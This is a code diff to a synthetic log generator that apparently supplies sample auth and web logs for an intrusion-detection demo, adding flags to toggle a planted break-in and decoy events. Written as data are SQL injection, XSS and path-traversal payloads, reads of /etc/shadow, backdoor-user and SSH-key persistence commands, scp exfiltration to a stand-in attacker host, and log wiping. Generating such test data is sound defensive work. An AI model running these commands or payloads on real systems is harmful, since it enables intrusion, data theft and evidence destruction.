@@ -26,7 +26,9 @@ const nginxTime = (d) => `${pad(d.getUTCDate())}/${MON[d.getUTCMonth()]}/${d.get
 export const ATTACKER_IP = '203.0.113.45';
 export const NOISE_IP = '198.51.100.77';
 
-export function generate({ seed = 42, start = '2026-10-01T00:00:00Z', days = 3 } = {}) {
+// attack: include the planted break-in. distractors: include the borderline
+// stuff (failed brute force, carol's new IP, guest sudo) that should rank low.
+export function generate({ seed = 42, start = '2026-10-01T00:00:00Z', days = 3, attack = true, distractors = true } = {}) {
   const r = rng(seed);
   const pick = (arr) => arr[Math.floor(r() * arr.length)];
   const int = (lo, hi) => lo + Math.floor(r() * (hi - lo + 1));
@@ -124,100 +126,104 @@ export function generate({ seed = 42, start = '2026-10-01T00:00:00Z', days = 3 }
   }
 
   // ------------------------------------------------- distractors / noise
-  // a noisy but unsuccessful brute force on day 1 (should be a separate, lower incident)
-  {
-    let d = at(0, 14, 2, 0);
-    const users = ['root', 'root', 'root', 'admin', 'root', 'ubuntu', 'root'];
-    for (let k = 0; k < 28; k++) {
-      d = new Date(+d + int(3, 9) * 1000);
-      sshd(d, `Failed password for ${k % 4 === 0 ? 'invalid user ' : ''}${pick(users)} from ${NOISE_IP} port ${int(40000, 60000)} ssh2`);
+  if (distractors) {
+    // a noisy but unsuccessful brute force on day 1 (should be a separate, lower incident)
+    {
+      let d = at(0, 14, 2, 0);
+      const users = ['root', 'root', 'root', 'admin', 'root', 'ubuntu', 'root'];
+      for (let k = 0; k < 28; k++) {
+        d = new Date(+d + int(3, 9) * 1000);
+        sshd(d, `Failed password for ${k % 4 === 0 ? 'invalid user ' : ''}${pick(users)} from ${NOISE_IP} port ${int(40000, 60000)} ssh2`);
+      }
     }
+    // carol logs in from home on the evening of day 3 (new IP + odd hour -> low/medium, not critical)
+    sshd(at(2, 17, 40, 12), `Accepted publickey for carol from 49.36.122.18 port 51514 ssh2`);
+    sshd(at(2, 18, 2, 40), `Disconnected from user carol 49.36.122.18 port 51514`);
+    // guest tries sudo once
+    sudoDenied(at(1, 9, 12, 0), 'guest', '/usr/bin/apt install htop');
   }
-  // carol logs in from home on the evening of day 3 (new IP + odd hour -> low/medium, not critical)
-  sshd(at(2, 17, 40, 12), `Accepted publickey for carol from 49.36.122.18 port 51514 ssh2`);
-  sshd(at(2, 18, 2, 40), `Disconnected from user carol 49.36.122.18 port 51514`);
-  // guest tries sudo once
-  sudoDenied(at(1, 9, 12, 0), 'guest', '/usr/bin/apt install htop');
 
   // ------------------------------------------------------- the attack (day 3)
-  const A = ATTACKER_IP;
-  const D = 2;
-  // 1) recon: directory brute forcing the web app
-  {
-    let d = at(D, 1, 48, 0);
-    const probes = ['/.env', '/.git/config', '/wp-admin/', '/wp-login.php', '/phpmyadmin/', '/admin', '/admin/login', '/backup.zip', '/config.json', '/server-status', '/actuator/health', '/api/v1/users', '/.aws/credentials', '/.DS_Store', '/xmlrpc.php'];
-    const words = ['test', 'old', 'dev', 'staging', 'tmp', 'private', 'uploads', 'files', 'db', 'sql', 'logs', 'internal', 'debug', 'console', 'panel', 'portal', 'beta', 'v2', 'api/v2', 'cgi-bin/'];
-    for (const p of probes) {
-      d = new Date(+d + int(1, 4) * 1000);
-      req(d, A, null, 'GET', p, p === '/admin' ? 302 : 404, 153, 'gobuster/3.6');
+  if (attack) {
+    const A = ATTACKER_IP;
+    const D = 2;
+    // 1) recon: directory brute forcing the web app
+    {
+      let d = at(D, 1, 48, 0);
+      const probes = ['/.env', '/.git/config', '/wp-admin/', '/wp-login.php', '/phpmyadmin/', '/admin', '/admin/login', '/backup.zip', '/config.json', '/server-status', '/actuator/health', '/api/v1/users', '/.aws/credentials', '/.DS_Store', '/xmlrpc.php'];
+      const words = ['test', 'old', 'dev', 'staging', 'tmp', 'private', 'uploads', 'files', 'db', 'sql', 'logs', 'internal', 'debug', 'console', 'panel', 'portal', 'beta', 'v2', 'api/v2', 'cgi-bin/'];
+      for (const p of probes) {
+        d = new Date(+d + int(1, 4) * 1000);
+        req(d, A, null, 'GET', p, p === '/admin' ? 302 : 404, 153, 'gobuster/3.6');
+      }
+      for (const w of words) {
+        d = new Date(+d + int(1, 3) * 1000);
+        req(d, A, null, 'GET', `/${w}`, 404, 153, 'gobuster/3.6');
+      }
     }
-    for (const w of words) {
-      d = new Date(+d + int(1, 3) * 1000);
-      req(d, A, null, 'GET', `/${w}`, 404, 153, 'gobuster/3.6');
+    // 2) exploitation: SQL injection attempts on the product page
+    {
+      let d = at(D, 1, 58, 10);
+      const payloads = [
+        "/products?id=12'",
+        "/products?id=12' OR '1'='1",
+        '/products?id=12%20UNION%20SELECT%20null,null,null--',
+        '/products?id=12%20UNION%20SELECT%20username,password,null%20FROM%20users--',
+        '/products?id=12%20AND%20SLEEP(5)--',
+        '/products?id=12;%20DROP%20TABLE%20users--',
+        '/search?q=%3Cscript%3Ealert(1)%3C/script%3E',
+        '/download?file=../../../../etc/passwd',
+      ];
+      for (const p of payloads) {
+        d = new Date(+d + int(5, 25) * 1000);
+        req(d, A, null, 'GET', p, p.includes('UNION') && p.includes('username') ? 200 : 500, p.includes('username') ? 4821 : 312, 'sqlmap/1.8.4#stable');
+      }
     }
-  }
-  // 2) exploitation: SQL injection attempts on the product page
-  {
-    let d = at(D, 1, 58, 10);
-    const payloads = [
-      "/products?id=12'",
-      "/products?id=12' OR '1'='1",
-      '/products?id=12%20UNION%20SELECT%20null,null,null--',
-      '/products?id=12%20UNION%20SELECT%20username,password,null%20FROM%20users--',
-      '/products?id=12%20AND%20SLEEP(5)--',
-      '/products?id=12;%20DROP%20TABLE%20users--',
-      '/search?q=%3Cscript%3Ealert(1)%3C/script%3E',
-      '/download?file=../../../../etc/passwd',
+    // 3) credential access: ssh brute force + spraying usernames
+    let d = at(D, 2, 10, 5);
+    const targets = ['root', 'admin', 'ubuntu', 'test', 'oracle', 'postgres', 'deploy', 'git', 'jenkins', 'deploy', 'deploy'];
+    for (let k = 0; k < 46; k++) {
+      d = new Date(+d + int(10, 30) * 1000);
+      const u = targets[k % targets.length];
+      const invalid = !['root', 'deploy', 'ubuntu'].includes(u);
+      sshd(d, `Failed password for ${invalid ? 'invalid user ' : ''}${u} from ${A} port ${int(40000, 60000)} ssh2`);
+    }
+    // 4) initial access: weak password on the deploy account works
+    d = at(D, 2, 31, 40);
+    sshd(d, `Accepted password for deploy from ${A} port 50311 ssh2`);
+    // 5) privilege escalation, persistence, collection, cleanup
+    const steps = [
+      [1, 32, '/bin/cat /etc/shadow'],
+      [2, 10, '/usr/sbin/useradd -m -s /bin/bash sysupdate'],
+      [2, 40, '/usr/sbin/usermod -aG sudo sysupdate'],
+      [3, 30, '/usr/bin/tee -a /root/.ssh/authorized_keys'],
+      [4, 15, '/usr/bin/crontab -e'],
+      [9, 0, '/bin/tar czf /tmp/.cache.tgz /var/www/app /etc/app'],
+      [12, 30, '/usr/bin/mysqldump --all-databases -r /tmp/.db.sql'],
+      [14, 0, '/usr/bin/scp /tmp/.cache.tgz /tmp/.db.sql loot@203.0.113.45:/drop/'],
+      [21, 5, '/usr/bin/truncate -s 0 /var/log/nginx/access.log.1'],
     ];
-    for (const p of payloads) {
-      d = new Date(+d + int(5, 25) * 1000);
-      req(d, A, null, 'GET', p, p.includes('UNION') && p.includes('username') ? 200 : 500, p.includes('username') ? 4821 : 312, 'sqlmap/1.8.4#stable');
+    for (const [m, s, cmd] of steps) sudo(new Date(+d + (m * 60 + s) * 1000), 'deploy', cmd);
+    // 6) the web side: stolen admin creds (from the db dump) used on the app + bulk export
+    {
+      let w = at(D, 2, 46, 0);
+      for (let k = 0; k < 7; k++) {
+        w = new Date(+w + int(3, 8) * 1000);
+        req(w, A, null, 'POST', '/login', 401, 312, UA_BROWSER);
+      }
+      w = new Date(+w + 6000);
+      req(w, A, 'mike', 'POST', '/login', 302, 0, UA_BROWSER);
+      for (const p of ['/dashboard', '/api/customers?page=1', '/settings']) {
+        w = new Date(+w + int(5, 20) * 1000);
+        req(w, A, 'mike', 'GET', p, 200, int(5000, 30000), UA_BROWSER);
+      }
+      for (const t of ['customers', 'orders', 'payments']) {
+        w = new Date(+w + int(30, 90) * 1000);
+        req(w, A, 'mike', 'GET', `/api/export?table=${t}&format=csv&limit=all`, 200, int(52_000_000, 78_000_000), 'python-requests/2.32');
+      }
     }
+    sshd(at(D, 2, 58, 30), `Disconnected from user deploy ${A} port 50311`);
   }
-  // 3) credential access: ssh brute force + spraying usernames
-  let d = at(D, 2, 10, 5);
-  const targets = ['root', 'admin', 'ubuntu', 'test', 'oracle', 'postgres', 'deploy', 'git', 'jenkins', 'deploy', 'deploy'];
-  for (let k = 0; k < 46; k++) {
-    d = new Date(+d + int(10, 30) * 1000);
-    const u = targets[k % targets.length];
-    const invalid = !['root', 'deploy', 'ubuntu'].includes(u);
-    sshd(d, `Failed password for ${invalid ? 'invalid user ' : ''}${u} from ${A} port ${int(40000, 60000)} ssh2`);
-  }
-  // 4) initial access: weak password on the deploy account works
-  d = at(D, 2, 31, 40);
-  sshd(d, `Accepted password for deploy from ${A} port 50311 ssh2`);
-  // 5) privilege escalation, persistence, collection, cleanup
-  const steps = [
-    [1, 32, '/bin/cat /etc/shadow'],
-    [2, 10, '/usr/sbin/useradd -m -s /bin/bash sysupdate'],
-    [2, 40, '/usr/sbin/usermod -aG sudo sysupdate'],
-    [3, 30, '/usr/bin/tee -a /root/.ssh/authorized_keys'],
-    [4, 15, '/usr/bin/crontab -e'],
-    [9, 0, '/bin/tar czf /tmp/.cache.tgz /var/www/app /etc/app'],
-    [12, 30, '/usr/bin/mysqldump --all-databases -r /tmp/.db.sql'],
-    [14, 0, '/usr/bin/scp /tmp/.cache.tgz /tmp/.db.sql loot@203.0.113.45:/drop/'],
-    [21, 5, '/usr/bin/truncate -s 0 /var/log/nginx/access.log.1'],
-  ];
-  for (const [m, s, cmd] of steps) sudo(new Date(+d + (m * 60 + s) * 1000), 'deploy', cmd);
-  // 6) the web side: stolen admin creds (from the db dump) used on the app + bulk export
-  {
-    let w = at(D, 2, 46, 0);
-    for (let k = 0; k < 7; k++) {
-      w = new Date(+w + int(3, 8) * 1000);
-      req(w, A, null, 'POST', '/login', 401, 312, UA_BROWSER);
-    }
-    w = new Date(+w + 6000);
-    req(w, A, 'mike', 'POST', '/login', 302, 0, UA_BROWSER);
-    for (const p of ['/dashboard', '/api/customers?page=1', '/settings']) {
-      w = new Date(+w + int(5, 20) * 1000);
-      req(w, A, 'mike', 'GET', p, 200, int(5000, 30000), UA_BROWSER);
-    }
-    for (const t of ['customers', 'orders', 'payments']) {
-      w = new Date(+w + int(30, 90) * 1000);
-      req(w, A, 'mike', 'GET', `/api/export?table=${t}&format=csv&limit=all`, 200, int(52_000_000, 78_000_000), 'python-requests/2.32');
-    }
-  }
-  sshd(at(D, 2, 58, 30), `Disconnected from user deploy ${A} port 50311`);
 
   const toText = (rows) => rows.sort((a, b) => a[0] - b[0]).map((x) => x[1]).join('\n') + '\n';
   return { auth: toText(auth), access: toText(web) };
@@ -226,8 +232,15 @@ export function generate({ seed = 42, start = '2026-10-01T00:00:00Z', days = 3 }
 if (process.argv[1]?.endsWith('generate-logs.js')) {
   const out = new URL('../../samples/', import.meta.url);
   await mkdir(out, { recursive: true });
-  const { auth, access } = generate();
-  await writeFile(new URL('auth.log', out), auth);
-  await writeFile(new URL('access.log', out), access);
-  console.log(`wrote samples/auth.log (${auth.split('\n').length - 1} lines), samples/access.log (${access.split('\n').length - 1} lines)`);
+  const write = async (name, text) => {
+    await writeFile(new URL(name, out), text);
+    console.log(`wrote samples/${name} (${text.split('\n').length - 1} lines)`);
+  };
+  // full scenario: ssh + web logs, attack + distractors
+  const full = generate();
+  await write('auth.log', full.auth);
+  await write('access.log', full.access);
+  // two single-file samples for a quick before/after demo
+  await write('attack.log', generate({ seed: 42 }).auth);
+  await write('normal.log', generate({ seed: 7, attack: false, distractors: false }).auth);
 }
